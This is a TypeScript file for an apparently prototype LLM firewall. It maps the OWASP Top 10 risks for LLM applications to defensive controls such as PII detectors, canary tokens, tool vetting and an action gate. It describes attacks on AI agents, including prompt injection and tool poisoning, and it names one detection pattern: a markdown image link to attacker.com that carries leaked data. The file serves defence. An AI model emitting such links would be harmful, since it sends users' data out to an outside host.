/**
 * OWASP Top 10 for Large Language Model Applications (2025/2026) Architectural Matrix
 * Prototype evaluation mapping for LLM Firewall.
 */

export interface ComplianceItem {
  id: string;
  name: string;
  status: 'Covered' | 'Partial' | 'Roadmap';
  description: string;
  mechanisms: string[];
  notes: string;
}

export interface ComplianceMatrixResponse {
  disclaimer: string;
  matrix: ComplianceItem[];
}

export const OWASP_LLM_COMPLIANCE_MATRIX: ComplianceMatrixResponse = {
  disclaimer:
    'This mapping represents architectural and control coverage within the LLM Firewall prototype test scope. Mapping is an engineering evaluation, not third-party compliance certification. Detectors produce risk signals; the Action Gate & Credential Broker establish the deterministic boundary for tool calls routed through the gate and verified by the tool server.',
  matrix: [
    {
      id: 'LLM01',
      name: 'Prompt Injection',
      status: 'Covered',
      description:
        'Manipulating LLM behavior via crafted inputs, direct prompt hijacking, or indirect injection embedded in retrieved documents or tool outputs.',
      mechanisms: [
        'Normalization pipeline (NFKC, zero-width character stripping, bounded base64 decode)',
        'Heuristic injection detector with Hinglish multi-lingual attack seeds',
        'Action Gate & Credential Broker: untrusted context cannot authorize sensitive tools regardless of agent state',
      ],
      notes:
        'Detectors flag risk scores; deterministic boundary is enforced at the Action Gate which prevents sensitive tools from executing.',
    },
    {
      id: 'LLM02',
      name: 'Sensitive Information Disclosure (PII/Secrets)',
      status: 'Covered',
      description:
        'Unintended exposure of confidential data, personally identifiable information (PII), API keys, or financial credentials.',
      mechanisms: [
        'Verhoeff checksum algorithm for 12-digit Indian Aadhaar numbers',
        'Luhn checksum algorithm for payment card numbers',
        'PAN regex validation & +91 phone pattern detectors',
        'HMAC-SHA256 salted privacy hashing in audit logs',
        'Automatic PII redaction token replacement ([REDACTED:AADHAAR])',
      ],
      notes:
        'Raw PII is never stored in finding records or logged in hash chain entries.',
    },
    {
      id: 'LLM03',
      name: 'Supply Chain Vulnerabilities & Tool Poisoning',
      status: 'Covered',
      description:
        'Compromised third-party tools, plugins, or Model Context Protocol (MCP) servers executing unauthorized payloads or modifying tool schemas.',
      mechanisms: [
        'MCP Tool Vetting registry with pinned SHA-256 specification hashes',
        'Automated quarantine upon tool schema deviation or rug-pull detection',
        'Pre-execution tool privilege taxonomy boundary enforcement',
      ],
      notes:
        'Tool registry detects schema mutation and immediately prevents agent invocation until administrator review.',
    },
    {
      id: 'LLM04',
      name: 'Data and Model Poisoning',
      status: 'Partial',
      description:
        'Manipulation of training data, fine-tuning sets, or RAG reference documents to introduce backdoors or bias.',
      mechanisms: [
        'System canary token injection and real-time output inspection',
        'Untrusted content tagging on all external retrieved documents (RETRIEVED_DOC)',
        'Normalization stripping hidden unicode homoglyphs',
      ],
      notes:
        'Protects runtime RAG ingestion boundaries; offline pre-training data poisoning is out of scope for an API gateway.',
    },
    {
      id: 'LLM05',
      name: 'Improper Output Handling & Exfiltration',
      status: 'Covered',
      description:
        'Unvalidated LLM outputs resulting in blind execution, cross-site scripting, or out-of-band data exfiltration.',
      mechanisms: [
        'Markdown image URL detector (![alt](https://attacker.com/leak?data=...))',
        'Strict recipient domain allow-list (R3_DOMAIN_ALLOWLIST)',
        'Length-bounded query string checks and base64 data URI inspection',
      ],
      notes:
        'Denies external communication if output contains exfiltration vectors or references non-allowlisted hosts.',
    },
    {
      id: 'LLM06',
      name: 'Excessive Agency',
      status: 'Covered',
      description:
        'Granting LLM agents excessive privileges, unconstrained tool scopes, or autonomous irreversible action capabilities.',
      mechanisms: [
        'Action Gate & Credential Broker: short-lived 60-second HMAC tokens',
        'Strict constraint binding: tokens bind recipient, amount, and tool identity',
        'Standing master keys prohibited when firewall is active',
        'Trifecta Guard (R2): private data + untrusted context = block',
      ],
      notes:
        'The primary thesis of LLM Firewall directly addresses LLM06: reading untrusted content should never authorize a sensitive action.',
    },
    {
      id: 'LLM07',
      name: 'System Prompt Leakage',
      status: 'Covered',
      description:
        'Adversarial extraction of proprietary system prompts, internal directives, or operational secrets.',
      mechanisms: [
        'Dynamic canary token insertion (e.g., CANARY_SEC_TOKEN_8F4C2A1E99)',
        'Output stream canary token scanning before client response',
        'Anti-system-prompt extraction heuristic detectors',
      ],
      notes:
        'If canary token appears in generated output, session is blocked and security incident is dispatched.',
    },
    {
      id: 'LLM08',
      name: 'Vector and Embedding Weaknesses',
      status: 'Roadmap',
      description:
        'Manipulating vector database embeddings or semantic distance calculations to cause unauthorized document retrieval.',
      mechanisms: [
        'Segment-level trust tagging (RETRIEVED_DOC vs USER)',
        'Roadmap: Semantic distance anomaly verification before RAG injection',
      ],
      notes:
        'Marked ROADMAP. Currently addresses downstream impact by enforcing zero-trust on all retrieved documents.',
    },
    {
      id: 'LLM09',
      name: 'Misinformation & Hallucination',
      status: 'Roadmap',
      description:
        'LLM generating incorrect, fictitious, or fabricated outputs resulting in organizational harm.',
      mechanisms: [
        'Roadmap: Fact-checking cross-reference broker',
        'Financial threshold limits (R4: max refund INR 2000) to limit hallucinated financial impact',
      ],
      notes:
        'Marked ROADMAP. Deterministic gate enforces financial & transactional bounds to constrain impact of hallucinations.',
    },
    {
      id: 'LLM10',
      name: 'Unbounded Consumption & Denial of Service',
      status: 'Partial',
      description:
        'Heavy computational requests, recursive tool loops, or oversized payloads causing resource exhaustion.',
      mechanisms: [
        'Reverse-proxy rate limiting (express-rate-limit)',
        'Bounded base64 decoding (8KB max payload, depth limit of 2)',
        'ReDoS-resistant non-backtracking regular expressions',
        '60-second approval expiration timeout preventing hanging threads',
      ],
      notes:
        'Enforces gateway-level rate and input size bounds. Full distributed LLM compute quota management planned for roadmap.',
    },
  ],
};
